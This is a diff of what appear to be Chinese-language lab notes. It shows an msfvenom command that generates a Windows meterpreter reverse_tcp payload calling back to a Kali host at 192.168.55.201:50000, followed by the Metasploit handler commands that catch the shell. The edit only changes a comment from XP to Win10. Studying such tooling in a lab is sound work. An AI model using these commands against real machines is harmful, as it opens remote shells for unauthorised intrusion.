@@ -25,7 +25,7 @@ msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.55.201 lport=50000 -f 
 
 打开监听
 use exploit/multi/handler 
-set payload windows/meterpreter/reverse_tcp     xp是   x86 32位的
+set payload windows/meterpreter/reverse_tcp     win10是   x86 32位的
 set lhost 192.168.55.201                 kali  ip 地址
 set lport 50000                          
 run
